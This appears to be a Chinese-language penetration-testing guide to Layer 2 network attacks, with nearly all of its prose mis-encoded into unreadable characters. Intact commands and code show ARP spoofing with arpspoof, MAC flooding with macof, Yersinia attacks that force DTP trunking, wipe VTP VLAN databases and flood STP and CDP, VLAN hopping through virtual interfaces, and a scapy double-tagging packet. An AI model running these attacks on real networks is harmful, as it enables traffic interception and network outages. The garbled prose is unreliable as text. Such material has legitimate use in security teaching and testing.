Arpspoofå·¥å…·æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥åœ¨Linuxå’ŒUnixç³»ç»Ÿä¸Šä½¿ç”¨ã€‚å®ƒå…è®¸æ”»å‡»è€…å°†è‡ªå·±ä¼ªè£…æˆç½‘ç»œä¸­çš„å…¶ä»–è®¾å¤‡ï¼Œå¹¶å‘é€è™šå‡çš„ARPå“åº”ï¼Œæ¬ºéª—ç›®æ ‡è®¾å¤‡å°†å…¶ç½‘ç»œæµé‡å‘é€åˆ°æ”»å‡»è€…çš„æœºå™¨ä¸Šã€‚

ä½¿ç”¨Arpspoofæ—¶ï¼Œæ”»å‡»è€…éœ€è¦åœ¨åŒä¸€å±€åŸŸç½‘ä¸­ï¼Œå…·æœ‰ç½‘ç»œè®¿é—®æƒé™ï¼Œå¹¶ä¸”èƒ½å¤Ÿæˆªè·ç›®æ ‡è®¾å¤‡å’Œç½‘å…³ä¹‹é—´çš„é€šä¿¡ã€‚é€šè¿‡æ¬ºéª—ç›®æ ‡è®¾å¤‡ï¼Œæ”»å‡»è€…å¯ä»¥ç›‘è§†ã€ç¯¡æ”¹æˆ–çªƒå–ç›®æ ‡è®¾å¤‡ä¸ç½‘å…³ä¹‹é—´çš„é€šä¿¡æ•°æ®ã€‚

è¦ä½¿ç”¨Arpspoofè¿›è¡ŒARPæ¬ºéª—æ”»å‡»ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```
arpspoof -i <interface> -t <target> <gateway>
```

å…¶ä¸­ï¼Œ`<interface>`æ˜¯æ”»å‡»è€…æ‰€åœ¨çš„ç½‘ç»œæ¥å£ï¼Œ`<target>`æ˜¯ç›®æ ‡è®¾å¤‡çš„IPåœ°å€ï¼Œ`<gateway>`æ˜¯ç½‘å…³çš„IPåœ°å€ã€‚

è¯·æ³¨æ„ï¼Œä½¿ç”¨Arpspoofè¿›è¡ŒARPæ¬ºéª—æ”»å‡»æ˜¯éæ³•çš„ï¼Œé™¤éæ‚¨æœ‰åˆæ³•çš„æˆæƒå’Œç›®çš„ã€‚æœ¬ä¹¦ä»…æä¾›æŠ€æœ¯ä¿¡æ¯ï¼Œä¸é¼“åŠ±æˆ–æ”¯æŒä»»ä½•éæ³•æ´»åŠ¨ã€‚
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAMæº¢å‡º

é€šè¿‡å‘é€å¤§é‡å…·æœ‰ä¸åŒæºMACåœ°å€çš„æ•°æ®åŒ…æ¥æº¢å‡ºäº¤æ¢æœºçš„CAMè¡¨ã€‚å½“CAMè¡¨å·²æ»¡æ—¶ï¼Œäº¤æ¢æœºå°†å¼€å§‹åƒé›†çº¿å™¨ä¸€æ ·è¡Œä¸ºï¼ˆå¹¿æ’­æ‰€æœ‰æµé‡ï¼‰ã€‚
```bash
macof -i <interface>
```
åœ¨ç°ä»£äº¤æ¢æœºä¸­ï¼Œè¿™ä¸ªæ¼æ´å·²ç»ä¿®å¤ã€‚

### 802.1Q VLAN / DTP æ”»å‡»

#### åŠ¨æ€ä¸­ç»§

**DTPï¼ˆåŠ¨æ€ä¸­ç»§åè®®ï¼‰**æ˜¯ä¸€ç§é“¾è·¯å±‚åè®®ï¼Œæ—¨åœ¨æä¾›è‡ªåŠ¨ä¸­ç»§ç³»ç»Ÿã€‚é€šè¿‡DTPï¼Œäº¤æ¢æœºå†³å®šå“ªä¸ªç«¯å£å°†å·¥ä½œåœ¨ä¸­ç»§æ¨¡å¼ï¼ˆTrunkï¼‰ï¼Œå“ªä¸ªç«¯å£å°†ä¸å·¥ä½œåœ¨ä¸­ç»§æ¨¡å¼ã€‚ä½¿ç”¨**DTP**è¡¨ç¤º**ç½‘ç»œè®¾è®¡ä¸ä½³**ã€‚**ä¸­ç»§åº”è¯¥ä¸¥æ ¼é™åˆ¶åœ¨éœ€è¦çš„åœ°æ–¹ï¼Œå¹¶ä¸”åº”è¯¥æœ‰æ–‡æ¡£è®°å½•ã€‚**

**é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰äº¤æ¢æœºç«¯å£éƒ½åœ¨åŠ¨æ€è‡ªåŠ¨æ¨¡å¼ä¸‹è¿è¡Œã€‚**è¿™è¡¨ç¤ºäº¤æ¢æœºç«¯å£å¤„äºä¸ç›¸é‚»äº¤æ¢æœºçš„ä¸­ç»§åˆå§‹åŒ–æ¨¡å¼ã€‚**æ¸—é€æµ‹è¯•äººå‘˜éœ€è¦ç‰©ç†è¿æ¥åˆ°äº¤æ¢æœºå¹¶å‘é€ä¸€ä¸ªDTP Desirableå¸§**ï¼Œè§¦å‘ç«¯å£åˆ‡æ¢åˆ°ä¸­ç»§æ¨¡å¼ã€‚æ”»å‡»è€…éšåå¯ä»¥ä½¿ç”¨STPå¸§åˆ†ææšä¸¾VLANï¼Œå¹¶é€šè¿‡åˆ›å»ºè™šæ‹Ÿæ¥å£ç»•è¿‡VLANåˆ†å‰²ã€‚

è®¸å¤šäº¤æ¢æœºé»˜è®¤æ”¯æŒåŠ¨æ€ä¸­ç»§åè®®ï¼ˆDTPï¼‰ï¼Œç„¶è€Œï¼Œæ”»å‡»è€…å¯ä»¥æ»¥ç”¨å®ƒæ¥**æ¨¡æ‹Ÿäº¤æ¢æœºå¹¶æ¥æ”¶æ‰€æœ‰VLANçš„æµé‡**ã€‚å·¥å…·[_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan)å¯ä»¥å—…æ¢æ¥å£å¹¶**æŠ¥å‘Šäº¤æ¢æœºæ˜¯å¦å¤„äºé»˜è®¤æ¨¡å¼ã€ä¸­ç»§æ¨¡å¼ã€åŠ¨æ€æ¨¡å¼ã€è‡ªåŠ¨æ¨¡å¼æˆ–æ¥å…¥æ¨¡å¼**ï¼ˆåªæœ‰æ¥å…¥æ¨¡å¼æ‰èƒ½é¿å…VLANè·³è·ƒï¼‰ã€‚è¯¥å·¥å…·å°†æŒ‡ç¤ºäº¤æ¢æœºæ˜¯å¦å­˜åœ¨æ¼æ´ã€‚

å¦‚æœå‘ç°ç½‘ç»œå­˜åœ¨æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨_**Yersinia**_å‘èµ·ä¸€ä¸ªä½¿ç”¨åè®®â€œ**DTP**â€çš„â€œ**å¯ç”¨ä¸­ç»§**â€ï¼Œä»è€Œèƒ½å¤ŸæŸ¥çœ‹æ‰€æœ‰VLANçš„ç½‘ç»œæ•°æ®åŒ…ã€‚
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

è¦æšä¸¾VLANï¼Œè¿˜å¯ä»¥ä½¿ç”¨è„šæœ¬[DTPHijacking.py](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)ç”ŸæˆDTP Desirableå¸§ã€‚**åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸è¦ä¸­æ–­è„šæœ¬ã€‚å®ƒæ¯ä¸‰ç§’æ³¨å…¥ä¸€ä¸ªDTP Desirableå¸§ã€‚äº¤æ¢æœºä¸ŠåŠ¨æ€åˆ›å»ºçš„trunké€šé“åªä¼šæŒç»­äº”åˆ†é’Ÿã€‚äº”åˆ†é’Ÿåï¼Œtrunkä¼šæ–­å¼€è¿æ¥ã€‚**
```
sudo python3 DTPHijacking.py --interface eth0
```
æˆ‘æƒ³æŒ‡å‡ºçš„æ˜¯ï¼Œ**Access/Desirable (0x03)** è¡¨ç¤º DTP å¸§æ˜¯ Desirable ç±»å‹ï¼Œå®ƒå‘Šè¯‰ç«¯å£åˆ‡æ¢åˆ° Trunk æ¨¡å¼ã€‚è€Œ **802.1Q/802.1Q (0xa5)** è¡¨ç¤º **802.1Q** å°è£…ç±»å‹ã€‚

é€šè¿‡åˆ†æ STP å¸§ï¼Œ**æˆ‘ä»¬äº†è§£åˆ° VLAN 30 å’Œ VLAN 60 çš„å­˜åœ¨**ã€‚

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### æ”»å‡»ç‰¹å®šçš„ VLAN

ä¸€æ—¦ä½ çŸ¥é“äº† VLAN ID å’Œ IP å€¼ï¼Œä½ å¯ä»¥**é…ç½®ä¸€ä¸ªè™šæ‹Ÿæ¥å£æ¥æ”»å‡»ç‰¹å®šçš„ VLAN**ã€‚\
å¦‚æœæ²¡æœ‰ DHCPï¼Œé‚£ä¹ˆä½¿ç”¨ _ifconfig_ æ¥è®¾ç½®é™æ€ IP åœ°å€ã€‚
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### è‡ªåŠ¨VLANè·³è·ƒ

è®¨è®ºä¸­æåˆ°çš„**åŠ¨æ€å¹²çº¿å’Œåˆ›å»ºè™šæ‹Ÿæ¥å£ä»¥åŠå‘ç°å…¶ä»–VLANä¸­çš„ä¸»æœº**çš„æ”»å‡»æ˜¯ç”±å·¥å…·è‡ªåŠ¨æ‰§è¡Œçš„ï¼š[**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### åŒæ ‡è®°

å¦‚æœæ”»å‡»è€…çŸ¥é“å—å®³ä¸»æœºçš„**MACã€IPå’ŒVLAN IDçš„å€¼**ï¼Œä»–å¯ä»¥å°è¯•ä½¿ç”¨æŒ‡å®šçš„VLANå’Œå—å®³è€…çš„VLANå¯¹å¸§è¿›è¡Œ**åŒæ ‡è®°**ï¼Œç„¶åå‘é€ä¸€ä¸ªæ•°æ®åŒ…ã€‚ç”±äº**å—å®³è€…æ— æ³•ä¸æ”»å‡»è€…å»ºç«‹è¿æ¥**ï¼Œæ‰€ä»¥**æ”»å‡»è€…æœ€å¥½çš„é€‰æ‹©æ˜¯é€šè¿‡UDPä¸å¯ä»¥æ‰§è¡Œä¸€äº›æœ‰è¶£æ“ä½œçš„åè®®è¿›è¡Œé€šä¿¡**ï¼ˆå¦‚SNMPï¼‰ã€‚

æ”»å‡»è€…çš„å¦ä¸€ä¸ªé€‰æ‹©æ˜¯é€šè¿‡æ¬ºéª—å—æ”»å‡»è€…å¯è®¿é—®çš„ç”±æ”»å‡»è€…æ§åˆ¶çš„IPæ¥å‘èµ·**TCPç«¯å£æ‰«æ**ï¼ˆå¯èƒ½é€šè¿‡äº’è”ç½‘ï¼‰ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨è‡ªå·±æ‹¥æœ‰çš„ç¬¬äºŒä¸ªä¸»æœºä¸Šå—…æ¢æ˜¯å¦æ¥æ”¶åˆ°æ¥è‡ªå—å®³è€…çš„ä¸€äº›æ•°æ®åŒ…ã€‚

![](<../../.gitbook/assets/image (635) (1).png>)

è¦æ‰§è¡Œæ­¤æ”»å‡»ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨scapyï¼š`pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### ä¾§å‘VLANåˆ†æ®µç»•è¿‡ <a href="#d679" id="d679"></a>

å¦‚æœæ‚¨å¯ä»¥**è®¿é—®ç›´æ¥è¿æ¥çš„äº¤æ¢æœº**ï¼Œåˆ™å¯ä»¥åœ¨ç½‘ç»œä¸­**ç»•è¿‡VLANåˆ†æ®µ**ã€‚åªéœ€å°†ç«¯å£åˆ‡æ¢åˆ°trunkæ¨¡å¼ï¼ˆä¹Ÿç§°ä¸ºtrunkï¼‰ï¼Œä½¿ç”¨ç›®æ ‡VLANçš„IDåˆ›å»ºè™šæ‹Ÿæ¥å£ï¼Œå¹¶é…ç½®IPåœ°å€ã€‚æ‚¨å¯ä»¥å°è¯•åŠ¨æ€è¯·æ±‚åœ°å€ï¼ˆDHCPï¼‰ï¼Œä¹Ÿå¯ä»¥é™æ€é…ç½®ã€‚è¿™å–å†³äºå…·ä½“æƒ…å†µã€‚

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### ç¬¬3å±‚ç§æœ‰VLANç»•è¿‡

åœ¨å®¢ç”¨æ— çº¿ç½‘ç»œå’Œå…¶ä»–ç¯å¢ƒä¸­ï¼Œä½¿ç”¨ç§æœ‰VLANï¼ˆä¹Ÿç§°ä¸º_ç«¯å£éš”ç¦»_ï¼‰è®¾ç½®æ¥**é˜²æ­¢å¯¹ç­‰æ–¹äº’åŠ¨**ï¼ˆå³ï¼Œå®¢æˆ·ç«¯**è¿æ¥åˆ°æ— çº¿æ¥å…¥ç‚¹ä½†æ— æ³•ç›¸äº’é€šä¿¡**ï¼‰ã€‚æ ¹æ®ç½‘ç»œACLï¼ˆæˆ–ç¼ºä¹ACLï¼‰ï¼Œå¯èƒ½å¯ä»¥å°†IPæ•°æ®åŒ…å‘é€åˆ°è·¯ç”±å™¨ï¼Œç„¶åå°†å…¶è½¬å‘å›ç›¸é‚»çš„å¯¹ç­‰æ–¹ã€‚

æ­¤æ”»å‡»å°†å‘å®¢æˆ·ç«¯çš„IPå‘é€**ç‰¹åˆ¶æ•°æ®åŒ…ï¼Œä½†ä½¿ç”¨è·¯ç”±å™¨çš„MACåœ°å€**ã€‚ç„¶åï¼Œ**è·¯ç”±å™¨å°†å°†æ•°æ®åŒ…é‡å®šå‘åˆ°å®¢æˆ·ç«¯**ã€‚ä¸_åŒæ ‡è®°æ”»å‡»_ä¸€æ ·ï¼Œæ‚¨å¯ä»¥é€šè¿‡æ§åˆ¶å—å®³è€…å¯è®¿é—®çš„ä¸»æœºæ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚

### VTPæ”»å‡»

**VTPï¼ˆVLAN Trunking Protocolï¼‰**æ˜¯ä¸€ç§ç”¨äºé›†ä¸­ç®¡ç†VLANçš„åè®®ã€‚ä¸ºäº†è·Ÿè¸ªå½“å‰çš„VLANæ•°æ®åº“ï¼Œäº¤æ¢æœºä¼šæ£€æŸ¥ç‰¹æ®Šçš„ä¿®è®¢å·ã€‚å½“å‘ç”Ÿä»»ä½•è¡¨æ›´æ–°æ—¶ï¼Œä¿®è®¢å·ä¼šå¢åŠ ä¸€ã€‚å¦‚æœäº¤æ¢æœºæ£€æµ‹åˆ°å…·æœ‰è¾ƒé«˜ä¿®è®¢å·çš„é…ç½®ï¼Œå®ƒå°†è‡ªåŠ¨æ›´æ–°å…¶VLANæ•°æ®åº“ã€‚

#### VTPåŸŸä¸­çš„è§’è‰² <a href="#ebfc" id="ebfc"></a>

* **VTPæœåŠ¡å™¨ã€‚** VTPæœåŠ¡å™¨è§’è‰²çš„äº¤æ¢æœºå¯ä»¥åˆ›å»ºæ–°çš„VLANï¼Œåˆ é™¤æ—§çš„VLANæˆ–æ›´æ”¹VLANæœ¬èº«çš„ä¿¡æ¯ã€‚**å®ƒè¿˜ä¸ºåŸŸä¸­çš„å…¶ä»–æˆå‘˜ç”ŸæˆVTPå…¬å‘Šã€‚**
* **VTPå®¢æˆ·ç«¯ã€‚** å¤„äºæ­¤è§’è‰²çš„äº¤æ¢æœºå°†ä»åŸŸä¸­çš„å…¶ä»–äº¤æ¢æœºæ¥æ”¶ç‰¹å®šçš„VTPå…¬å‘Šï¼Œä»¥æ›´æ–°å…¶è‡ªå·±çš„VLANæ•°æ®åº“ã€‚å®¢æˆ·ç«¯åœ¨åˆ›å»ºVLANæ–¹é¢å—åˆ°é™åˆ¶ï¼Œç”šè‡³ä¸å…è®¸åœ¨æœ¬åœ°æ›´æ”¹VLANé…ç½®ã€‚æ¢å¥è¯è¯´ï¼Œ**åªè¯»è®¿é—®ã€‚**
* **VTPé€æ˜ã€‚** åœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œäº¤æ¢æœºä¸å‚ä¸VTPè¿‡ç¨‹ï¼Œå¹¶å¯ä»¥å®Œå…¨å’Œæœ¬åœ°ç®¡ç†æ•´ä¸ªVLANé…ç½®ã€‚åœ¨é€æ˜æ¨¡å¼ä¸‹è¿è¡Œæ—¶ï¼Œäº¤æ¢æœºä»…ä¼ è¾“æ¥è‡ªå…¶ä»–äº¤æ¢æœºçš„VTPå…¬å‘Šï¼Œè€Œä¸å½±å“å…¶VLANé…ç½®ã€‚**æ­¤ç±»äº¤æ¢æœºçš„ä¿®è®¢å·å§‹ç»ˆä¸ºé›¶ï¼Œæ— æ³•å—åˆ°æ”»å‡»ã€‚**

#### å¹¿å‘Šç±»å‹ <a href="#b384" id="b384"></a>

* **æ‘˜è¦å¹¿å‘Š â€”** VTPæœåŠ¡å™¨æ¯**300ç§’ï¼ˆ5åˆ†é’Ÿï¼‰**å‘é€çš„VTPå…¬å‘Šã€‚æ­¤å…¬å‘Šå­˜å‚¨VTPåŸŸåã€åè®®ç‰ˆæœ¬ã€æ—¶é—´æˆ³å’ŒMD5é…ç½®å“ˆå¸Œå€¼ã€‚
* **å­é›†å¹¿å‘Š â€”** æ¯å½“å‘ç”ŸVLANé…ç½®æ›´æ”¹æ—¶å‘é€çš„VTPå¹¿å‘Šã€‚
* **å¹¿å‘Šè¯·æ±‚ â€”** VTPå®¢æˆ·ç«¯å‘VTPæœåŠ¡å™¨è¯·æ±‚æ‘˜è¦å¹¿å‘Šæ¶ˆæ¯ã€‚é€šå¸¸ä½œä¸ºå¯¹äº¤æ¢æœºæ£€æµ‹åˆ°å…·æœ‰è¾ƒé«˜é…ç½®ä¿®è®¢å·çš„æ‘˜è¦å¹¿å‘Šçš„å“åº”æ¶ˆæ¯å‘é€ã€‚

VTPåªèƒ½ä»trunkç«¯å£è¿›è¡Œæ”»å‡»ï¼Œå› ä¸ºVTPå…¬å‘Šåªåœ¨trunkç«¯å£ä¸Šå¹¿æ’­å’Œæ¥æ”¶ã€‚**å› æ­¤ï¼Œåœ¨æ”»å‡»DTPåï¼Œæ‚¨çš„ä¸‹ä¸€ä¸ªç›®æ ‡å¯èƒ½æ˜¯VTPã€‚**è¦æ”»å‡»VTPåŸŸï¼Œæ‚¨å¯ä»¥ä½¿ç”¨Yersiniaè¿è¡ŒVTPæ³¨å…¥ï¼Œä»è€Œåˆ é™¤æ•´ä¸ªVLANæ•°æ®åº“ï¼Œä»è€Œä½¿ç½‘ç»œç˜«ç—ªã€‚

{% hint style="info" %}
VTPåè®®æœ‰å¤šè¾¾**ä¸‰ä¸ªç‰ˆæœ¬**ã€‚æœ¬æ–‡æ”»å‡»çš„æ˜¯ç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼ŒVTPv1ã€‚
{% endhint %}
```bash
yersinia -G #For graphic mode
```
è¦åˆ é™¤æ•´ä¸ªVLANæ•°æ®åº“ï¼Œè¯·é€‰æ‹©**åˆ é™¤æ‰€æœ‰VTP VLAN**é€‰é¡¹

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### STPæ”»å‡»

**å¦‚æœæ‚¨æ— æ³•åœ¨æ¥å£ä¸Šæ•è·BPDUå¸§ï¼Œåˆ™å¾ˆéš¾æˆåŠŸè¿›è¡ŒSTPæ”»å‡»ã€‚**

#### **STP BPDU DoS**

é€šè¿‡å‘é€å¤§é‡çš„BPDUsï¼ˆæ‹“æ‰‘å˜åŒ–é€šçŸ¥ï¼‰æˆ–Confï¼ˆåœ¨åˆ›å»ºæ‹“æ‰‘æ—¶å‘é€çš„BPDUsï¼‰æ¥ä½¿äº¤æ¢æœºè¿‡è½½å¹¶åœæ­¢æ­£å¸¸å·¥ä½œã€‚
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP æ”»å‡»**

å½“å‘é€ TCP æ—¶ï¼Œäº¤æ¢æœºçš„ CAM è¡¨å°†åœ¨ 15 ç§’å†…è¢«åˆ é™¤ã€‚ç„¶åï¼Œå¦‚æœæ‚¨æŒç»­å‘é€è¿™ç§ç±»å‹çš„æ•°æ®åŒ…ï¼ŒCAM è¡¨å°†ä¸æ–­é‡æ–°å¯åŠ¨ï¼ˆæˆ–æ¯ 15 ç§’ä¸€æ¬¡ï¼‰ï¼Œå¹¶ä¸”åœ¨é‡æ–°å¯åŠ¨æ—¶ï¼Œäº¤æ¢æœºçš„è¡Œä¸ºç±»ä¼¼äºé›†çº¿å™¨ã€‚
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STPæ ¹æ”»å‡»**

æ”»å‡»è€…æ¨¡æ‹Ÿäº¤æ¢æœºçš„è¡Œä¸ºï¼Œæˆä¸ºç½‘ç»œçš„STPæ ¹ã€‚ç„¶åï¼Œæ›´å¤šçš„æ•°æ®å°†é€šè¿‡ä»–ä¼ é€’ã€‚å½“æ‚¨è¿æ¥åˆ°ä¸¤ä¸ªä¸åŒçš„äº¤æ¢æœºæ—¶ï¼Œè¿™æ˜¯å¾ˆæœ‰è¶£çš„ã€‚\
è¿™æ˜¯é€šè¿‡å‘é€BPDUs CONFæ•°æ®åŒ…ï¼Œå£°ç§°**ä¼˜å…ˆçº§**å€¼å°äºå®é™…æ ¹äº¤æ¢æœºçš„ä¼˜å…ˆçº§æ¥å®Œæˆçš„ã€‚
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**å¦‚æœæ”»å‡»è€…è¿æ¥åˆ°2ä¸ªäº¤æ¢æœºï¼Œä»–å¯ä»¥æˆä¸ºæ–°æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œæ‰€æœ‰è¿™ä¸¤ä¸ªäº¤æ¢æœºä¹‹é—´çš„æµé‡éƒ½å°†é€šè¿‡ä»–ä¼ é€’**ï¼ˆå°†æ‰§è¡Œä¸­é—´äººæ”»å‡»ï¼‰ã€‚
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDPæ”»å‡»

CISCO Discovery Protocolæ˜¯CISCOè®¾å¤‡ä¹‹é—´è¿›è¡Œé€šä¿¡çš„åè®®ï¼Œç”¨äº**å‘ç°è®¾å¤‡æ˜¯å¦åœ¨çº¿**ä»¥åŠå®ƒä»¬å…·æœ‰å“ªäº›åŠŸèƒ½ã€‚

#### ä¿¡æ¯æ”¶é›† <a href="#0e0f" id="0e0f"></a>

**é»˜è®¤æƒ…å†µä¸‹ï¼ŒCDPä¼šå‘æ‰€æœ‰ç«¯å£å‘é€é€šå‘Šã€‚**ä½†æ˜¯ï¼Œå¦‚æœå…¥ä¾µè€…è¿æ¥åˆ°åŒä¸€äº¤æ¢æœºä¸Šçš„ä¸€ä¸ªç«¯å£ï¼Œä»–å¯ä»¥ä½¿ç”¨ç½‘ç»œå—…æ¢å™¨ï¼ˆå¦‚Wiresharkã€tcpdumpæˆ–Yersiniaï¼‰æå–**æœ‰å…³è®¾å¤‡æœ¬èº«çš„æœ‰ä»·å€¼ä¿¡æ¯**ï¼Œä»å…¶å‹å·åˆ°Cisco IOSç‰ˆæœ¬ã€‚åˆ©ç”¨è¿™äº›ä¿¡æ¯ï¼Œä»–å°†èƒ½å¤Ÿæšä¸¾ç›¸åŒç‰ˆæœ¬çš„Cisco IOSå¹¶æ‰¾åˆ°æ¼æ´ï¼Œç„¶ååˆ©ç”¨å®ƒã€‚

#### CDPæ´ªæ³›æ”»å‡» <a href="#0d6a" id="0d6a"></a>

æ‚¨å¯ä»¥é€šè¿‡è€—å°½è®¾å¤‡å†…å­˜æ¥æ¨¡æ‹ŸçœŸå®çš„CISCOè®¾å¤‡ï¼Œå¯¹CISCOäº¤æ¢æœºè¿›è¡Œæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
é€‰æ‹©**æ³›æ´ªCDPè¡¨**é€‰é¡¹å¹¶å¼€å§‹æ”»å‡»ã€‚äº¤æ¢æœºçš„CPUå°†è¢«è¿‡è½½ï¼ŒCDPé‚»å±…è¡¨ä¹Ÿå°†è¢«è¿‡è½½ï¼Œ**å¯¼è‡´â€œç½‘ç»œç˜«ç—ªâ€ã€‚**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDPå†’å……æ”»å‡»
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨[**scapy**](https://github.com/secdev/scapy/)ã€‚ç¡®ä¿ä½¿ç”¨`scapy/contrib`è½¯ä»¶åŒ…è¿›è¡Œå®‰è£…ã€‚

### VoIPæ”»å‡»

å°½ç®¡æ—¨åœ¨ä¾›å‘˜å·¥ä½¿ç”¨çš„äº’è”ç½‘ç”µè¯ï¼ˆVoIPï¼‰ç”µè¯ï¼Œä½†ç°ä»£VoIPè®¾å¤‡è¶Šæ¥è¶Šå¤šåœ°ä¸ç‰©è”ç½‘è®¾å¤‡é›†æˆã€‚è®¸å¤šå‘˜å·¥ç°åœ¨å¯ä»¥ä½¿ç”¨ç‰¹æ®Šç”µè¯å·ç è§£é”é—¨ç¦ï¼Œæ§åˆ¶æˆ¿é—´çš„æ’æ¸©å™¨...

å·¥å…·[**voiphopper**](http://voiphopper.sourceforge.net)æ¨¡æ‹Ÿäº†Ciscoã€Avayaã€Nortelå’ŒAlcatel-Lucentç¯å¢ƒä¸­VoIPç”µè¯çš„è¡Œä¸ºã€‚å®ƒä½¿ç”¨å…¶æ”¯æŒçš„è®¾å¤‡å‘ç°åè®®ä¹‹ä¸€ï¼ˆå¦‚Cisco Discovery Protocolï¼ˆCDPï¼‰ã€åŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼ˆDHCPï¼‰ã€é“¾è·¯å±‚å‘ç°åè®®åª’ä½“ç«¯ç‚¹å‘ç°ï¼ˆLLDP-MEDï¼‰å’Œ802.1Q ARPï¼‰è‡ªåŠ¨å‘ç°è¯­éŸ³ç½‘ç»œçš„æ­£ç¡®VLAN IDã€‚

**VoIP Hopper**æ”¯æŒ**ä¸‰ç§**CDPæ¨¡å¼ã€‚**sniff**æ¨¡å¼æ£€æŸ¥ç½‘ç»œæ•°æ®åŒ…å¹¶å°è¯•å®šä½VLAN IDã€‚è¦ä½¿ç”¨å®ƒï¼Œè¯·å°†**`-c`**å‚æ•°è®¾ç½®ä¸º`0`ã€‚**spoof**æ¨¡å¼ç”Ÿæˆç±»ä¼¼äºçœŸå®VoIPè®¾å¤‡åœ¨ä¼ä¸šç½‘ç»œä¸­ä¼ è¾“çš„è‡ªå®šä¹‰æ•°æ®åŒ…ã€‚è¦ä½¿ç”¨å®ƒï¼Œè¯·å°†**`-c`**å‚æ•°è®¾ç½®ä¸º**`1`**ã€‚å¸¦æœ‰**pre-madepacket**çš„æ¬ºéª—æ¨¡å¼å‘é€ä¸Cisco 7971G-GE IPç”µè¯ç›¸åŒçš„æ•°æ®åŒ…ã€‚è¦ä½¿ç”¨å®ƒï¼Œè¯·å°†**`-c`**å‚æ•°è®¾ç½®ä¸º**`2`**ã€‚

